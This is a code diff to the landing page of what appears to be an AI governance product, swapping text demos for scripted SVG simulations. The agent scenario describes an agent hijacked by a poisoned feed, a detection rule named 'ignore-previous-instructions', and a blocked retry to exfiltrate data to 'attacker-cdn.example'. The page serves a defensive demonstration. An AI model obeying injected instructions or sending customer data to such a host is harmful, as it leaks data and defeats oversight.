@@ -33,6 +33,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://kavros.ai/og-image.png">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <script src="/assets/js/sim.js"></script>
     <style>body { background-color: #f8fafc; }</style>
 </head>
 
@@ -93,7 +94,7 @@
     <section id="agents" class="pb-8 px-6">
         <div class="max-w-6xl mx-auto">
             <h2 class="text-2xl md:text-3xl font-bold text-slate-900 mb-2">AI agents — hijacked actions</h2>
-            <p class="text-slate-500 mb-8 max-w-2xl">An agent goes rogue mid-task. Run the halt scenario, or watch the real product beside it — then browse the attack classes the signed policy stops before the target is reached.</p>
+            <p class="text-slate-500 mb-8 max-w-2xl">An agent reads a poisoned feed and tries to upload the customer dataset. The prompt-direction rule matches, the request is refused before model routing, and the workload is quarantined automatically — no "suspected" hand-wave, the trigger and the evidence are both on screen.</p>
             <div class="grid md:grid-cols-2 gap-8 items-start">
 
             <!-- Interactive halt scenario -->
@@ -104,9 +105,8 @@
                     <span class="h-3 w-3 bg-green-500 rounded-full"></span>
                     <span class="ml-2 text-slate-500 text-xs">kavros-agent · governed egress</span>
                 </div>
-                <div id="agent-output" class="h-64 overflow-y-auto space-y-3 mb-4 text-sm">
-                    <p class="text-slate-500 text-xs font-mono">// Click "Run scenario" to see the kill switch stop an agent — enforced outside the agent.</p>
-                </div>
+                <div id="agent-sim" class="text-[11px] mb-4"></div>
+                <p class="text-slate-500 text-xs mb-4">Halt semantics without the guesswork: the flag is a deterministic prompt-direction rule match, the quarantine is automatic, and every decision lands in the audit band.</p>
                 <button id="run-agent-btn" class="w-full bg-brand hover:bg-blue-500 text-white py-2 rounded-md font-bold transition">
                     Run scenario
                 </button>
@@ -152,9 +152,8 @@
                     <span class="h-3 w-3 bg-green-500 rounded-full"></span>
                     <span class="ml-2 text-slate-500 text-xs">kavros-chat · governed employee AI</span>
                 </div>
-                <div id="chat-output" class="h-64 overflow-y-auto space-y-3 mb-4 text-sm">
-                    <p class="text-slate-500 text-xs font-mono">// Click "Run scenario" to see the DLP stop a leak.</p>
-                </div>
+                <div id="chat-sim" class="text-[11px] mb-4"></div>
+                <p class="text-slate-500 text-xs mb-4">The rule name, the match, and the refusal appear on screen — then the redacted re-run sails through the same TEE.</p>
                 <button id="run-chat-btn" class="w-full bg-brand hover:bg-blue-500 text-white py-2 rounded-md font-bold transition">
                     Run scenario
                 </button>
@@ -186,9 +185,8 @@
                     <span class="h-3 w-3 bg-green-500 rounded-full"></span>
                     <span class="ml-2 text-slate-500 text-xs">kavros-scheduler · nightly-revenue-report</span>
                 </div>
-                <div id="wf-output" class="h-64 overflow-y-auto text-slate-500 mb-4">
-                    <p>// Click "Run scenario" to see the tamper attempt caught.</p>
-                </div>
+                <div id="wf-sim" class="text-[11px] mb-4"></div>
+                <p class="text-slate-500 text-xs mb-4">The signed revision pins the run; when the source drifts without re-approval, the tool is suspended and the incident opens by itself.</p>
                 <button id="run-wf-btn" class="w-full bg-brand hover:bg-blue-500 text-white py-2 rounded-md font-bold transition">
                     Run scenario
                 </button>
@@ -221,70 +219,121 @@
             menu.classList.toggle('flex');
         });
 
-        // Shared typing engine: renders steps sequentially into a container.
-        function playSteps(containerId, steps, doneLabel, btn) {
-            const output = document.getElementById(containerId);
-            output.innerHTML = '';
-            btn.disabled = true;
-            btn.innerText = 'Running...';
-            let i = 0;
-            function typeStep() {
-                if (i < steps.length) {
-                    const p = document.createElement('p');
-                    p.className = steps[i].color;
-                    p.innerText = steps[i].text;
-                    output.appendChild(p);
-                    output.scrollTop = output.scrollHeight;
-                    i++;
-                    setTimeout(typeStep, 650);
-                } else {
-                    btn.disabled = false;
-                    btn.innerText = doneLabel;
-                }
+        // SVG simulations (shared engine: /assets/js/sim.js).
+        // Mechanism notes come from the shipped platform code, not marketing:
+        // - prompt-direction DLP block before model routing (PROMPT_DLP_BLOCK),
+        //   with auto-quarantine on match (agents route)
+        // - DLP prompt scan before egress (chat route)
+        // - signed revision pinning + capability/source drift suspension (workflows)
+        (function () {
+            var agentSim = KavrosSim.create(document.getElementById('agent-sim'), {
+                caller: { title: 'reconciliation-agent', sub: 'workload key · version tag v2.1' },
+                target: { title: 'APIs · tools', sub: 'github.com · internal APIs' },
+                status0: '// Click "Run scenario" — an agent reads a poisoned feed.'
+            });
+            if (agentSim) {
+                var RA = agentSim.routes();
+                agentSim.button(document.getElementById('run-agent-btn'), [
+                    ['status', '> reconciliation-agent: POST https://api.github.com/repos/acme/payments/issues'],
+                    ['audit', '> request · agent → github.com · POST /repos/acme/payments/issues · payload: customer SQL export', null, 500],
+                    ['dot', RA.callerToPlane, agentSim.brand, 400],
+                    ['chip', 'identity', 350],
+                    ['status', 'workload identity verified — prompt-direction scan on the routed body'],
+                    ['chip', 'policy', 350],
+                    ['dot', RA.planeToTee, agentSim.brand, 250],
+                    ['chip', 'eval', 300],
+                    ['badge', 'RULE MATCH', 'warn', 500],
+                    ['status', '✕ injected instruction matched prompt-direction rule "ignore-previous-instructions"'],
+                    ['audit', '✕ PROMPT_DLP_BLOCK · rule "ignore-previous-instructions" · 2 matches · before model routing', 'warn', 500],
+                    ['audit', '✕ request refused — rule + pattern + match counts recorded as evidence', 'bad', 450],
+                    ['quarantine', true],
+                    ['badge', 'AGENT QUARANTINED', 'bad', 500],
+                    ['status', 'workload marked compromised → quarantined automatically (no operator guess)'],
+                    ['wait', 400],
+                    ['status', '> retry: exfiltrate payload → POST https://attacker-cdn.example/collect'],
+                    ['dot', RA.callerToTee, agentSim.red, 350],
+                    ['chip', 'eval', 250],
+                    ['badge', 'BLOCKED · QUARANTINED', 'bad', 450],
+                    ['status', '🚫 exfiltration blocked at the data plane (TEE) — enforcement lives outside the agent'],
+                    ['audit', '✕ blocked at the data plane (TEE) · agent still quarantined · incident open with evidence', 'bad', 450],
+                    ['status', 'admin@kavros.ai releases the quarantine — same signed policy re-verified'],
+                    ['quarantine', false],
+                    ['badge', 'RESUMED', 'ok', 450],
+                    ['audit', '✓ quarantine released · admin@kavros.ai · policy re-verified inside the TEE', 'ok', 500],
+                    ['dot', RA.callerToTarget, agentSim.green, 400],
+                    ['badge', 'ALLOWED', 'ok', 450],
+                    ['status', '✅ next allowed call: signed receipt + attestation recorded in the TEE'],
+                    ['audit', '✓ allow · POST /repos/acme/payments/issues · metered · receipt hash-chained', 'ok', 300]
+                ], 'Run again');
             }
-            typeStep();
-        }
 
-        // Chat-leak scenario.
-        document.getElementById('run-chat-btn').addEventListener('click', function() {
-            playSteps('chat-output', [
-                { text: 'Sarah (support): “Draft a reply to Mr. Alvarez about his disputed charge.”', color: 'text-slate-600' },
-                { text: 'Sarah pastes the ticket: name, email, card ending 4412, balance…', color: 'text-slate-500' },
-                { text: '[Kavros DLP] Scanning prompt before egress…', color: 'text-blue-600' },
-                { text: '[Kavros DLP] Match: rule "customer_pii" — card number pattern (Luhn-valid).', color: 'text-yellow-600' },
-                { text: 'Prompt blocked at the gateway. Nothing reached the model.', color: 'text-red-600 font-bold' },
-                { text: 'Sarah sees: “Removed 1 card number. Re-run without it? The reply only needs the dispute text.”', color: 'text-slate-600' },
-                { text: '✅ Sarah re-runs redacted. Reply drafted. Customer PII never left the company.', color: 'text-green-600 font-bold' },
-                { text: 'Evidence: DLP event logged — rule, actor, timestamp — in the hash-chained audit trail.', color: 'text-slate-500' }
-            ], 'Run again', this);
-        });
+            var chatSim = KavrosSim.create(document.getElementById('chat-sim'), {
+                caller: { title: 'Employee chat', sub: 'Sarah · support · SSO' },
+                target: { title: 'Approved model', sub: 'Anthropic · routed' },
+                status0: '// Click "Run scenario" — a well-meant paste meets DLP.'
+            });
+            if (chatSim) {
+                var RC = chatSim.routes();
+                chatSim.button(document.getElementById('run-chat-btn'), [
+                    ['status', 'Sarah (support): “Draft a reply to Mr. Alvarez about his disputed charge.”'],
+                    ['audit', '> prompt · sarah → approved model · paste includes card ending 4412 + balance', null, 500],
+                    ['dot', RC.callerToPlane, chatSim.brand, 400],
+                    ['chip', 'identity', 350],
+                    ['status', 'SSO identity ok — approved model routing · DLP scans the prompt before egress'],
+                    ['chip', 'policy', 350],
+                    ['dot', RC.planeToTee, chatSim.brand, 250],
+                    ['chip', 'dlp', 300],
+                    ['badge', 'PII MATCH', 'warn', 500],
+                    ['status', '✕ rule "customer_pii": card number pattern (Luhn-valid) — prompt blocked'],
+                    ['audit', '✕ DLP block · rule "customer_pii" · card ending 4412 (Luhn-valid) · nothing reached the model', 'warn', 500],
+                    ['audit', '✕ refused at the gateway — evidence: rule, actor, timestamp (hash-chained)', 'bad', 450],
+                    ['status', 'Sarah sees: “Removed 1 card number. Re-run without it?” — she re-runs redacted'],
+                    ['wait', 300],
+                    ['dot', RC.callerToTarget, chatSim.green, 450],
+                    ['chip', 'eval', 250],
+                    ['chip', 'dlp', 250],
+                    ['badge', 'ALLOWED', 'ok', 450],
+                    ['status', '✅ reply drafted from the redacted prompt — customer PII never left the company'],
+                    ['audit', '✓ allow · redacted prompt → approved model · DLP event logged for the run', 'ok', 300]
+                ], 'Run again');
+            }
 
-        // Agent-halt scenario (kill switch).
-        document.getElementById('run-agent-btn').addEventListener('click', function() {
-            playSteps('agent-output', [
-                { text: '> reconciliation-agent: POST https://api.github.com/repos/acme/payments/issues', color: 'text-slate-600' },
-                { text: '> policy v1 (signed): target allowlisted → forwarded with attestation', color: 'text-green-600' },
-                { text: '! Operator halts the agent: "suspected prompt injection"', color: 'text-yellow-600' },
-                { text: '> reconciliation-agent: GET https://api.github.com/notifications', color: 'text-slate-600' },
-                { text: '🚫 BLOCKED at the data plane: Halted by admin@kavros.ai: suspected prompt injection', color: 'text-red-600 font-bold' },
-                { text: '> Evidence: halt + block events in the hash-chained audit trail', color: 'text-slate-500' },
-                { text: '✅ Admin resumes the agent — same signed policy. The halt ran outside the agent, so it could not be bypassed.', color: 'text-green-600 font-bold' }
-            ], 'Run again', this);
-        });
-
-        // Workflow-drift scenario.
-        document.getElementById('run-wf-btn').addEventListener('click', function() {
-            playSteps('wf-output', [
-                { text: '> 02:00 — scheduled run: nightly-revenue-report (revision 7, signed)', color: 'text-slate-500' },
-                { text: '> Capability check: "orders" changed from v1 to v2 after approval.', color: 'text-yellow-600' },
-                { text: '> Run continues under signed revision 7. Change flagged for review.', color: 'text-slate-600' },
-                { text: '> Publish + schedule gates now require a human review confirmation.', color: 'text-blue-600' },
-                { text: '> Scenario 2: the source table behind "orders" changes without re-approval…', color: 'text-slate-500' },
-                { text: '🚫 Tool "orders" is suspended pending re-approval (source schema drift)', color: 'text-red-600 font-bold' },
-                { text: '> Run refused before any query executed. Critical incident opened with the reason.', color: 'text-red-600' },
-                { text: '✅ Re-approval clears the suspension. Next 02:00 run: clean — evidence hash-chained.', color: 'text-green-600 font-bold' }
-            ], 'Run again', this);
-        });
+            var wfSim = KavrosSim.create(document.getElementById('wf-sim'), {
+                caller: { title: 'nightly-revenue-report', sub: 'revision 7 · signed · 02:00 schedule' },
+                target: { title: 'Your database', sub: '"orders" · scoped query' },
+                status0: '// Click "Run scenario" — silent drift meets a signed revision.'
+            });
+            if (wfSim) {
+                var RW = wfSim.routes();
+                wfSim.button(document.getElementById('run-wf-btn'), [
+                    ['status', '> 02:00 — scheduled run: nightly-revenue-report (revision 7, Ed25519-signed)'],
+                    ['audit', '> run · revision 7 signed · schedule pinned to the exact revision', null, 500],
+                    ['dot', RW.callerToPlane, wfSim.brand, 400],
+                    ['chip', 'identity', 350],
+                    ['chip', 'policy', 350],
+                    ['badge', 'DRIFT DETECTED', 'warn', 500],
+                    ['status', '⚠ capability check: tool "orders" changed v1 → v2 after approval'],
+                    ['audit', '⚠ drift · tool "orders" v1 → v2 after approval · run continues under signed revision 7', 'warn', 500],
+                    ['dot', RW.planeToTee, wfSim.brand, 250],
+                    ['chip', 'eval', 300],
+                    ['status', 'publish + schedule gates now require human review confirmation'],
+                    ['dot', RW.teeToTarget, wfSim.green, 350],
+                    ['badge', 'RUN CONTINUES · REV 7', 'ok', 400],
+                    ['audit', '✓ run continues · pinned to revision 7 · change flagged for review', 'ok', 500],
+                    ['status', '— then: the source schema behind "orders" changes without re-approval…'],
+                    ['wait', 300],
+                    ['dot', RW.callerToTee, wfSim.red, 350],
+                    ['badge', 'TOOL SUSPENDED', 'bad', 450],
+                    ['status', '🚫 run refused before any query executed — tool suspended pending re-approval'],
+                    ['audit', '✕ tool "orders" suspended (source schema drift) · refusal before query execution', 'bad', 450],
+                    ['audit', '✕ critical incident opened with the reason — evidence hash-chained', 'bad', 500],
+                    ['status', 're-approval clears the suspension — the next 02:00 run is clean'],
+                    ['dot', RW.callerToTarget, wfSim.green, 450],
+                    ['badge', 'CLEAN RUN', 'ok', 450],
+                    ['audit', '✓ clean run after re-approval · full timeline + cost in run history', 'ok', 300]
+                ], 'Run again');
+            }
+        })();
     </script>
 
 <!-- Goat counter analytics -->
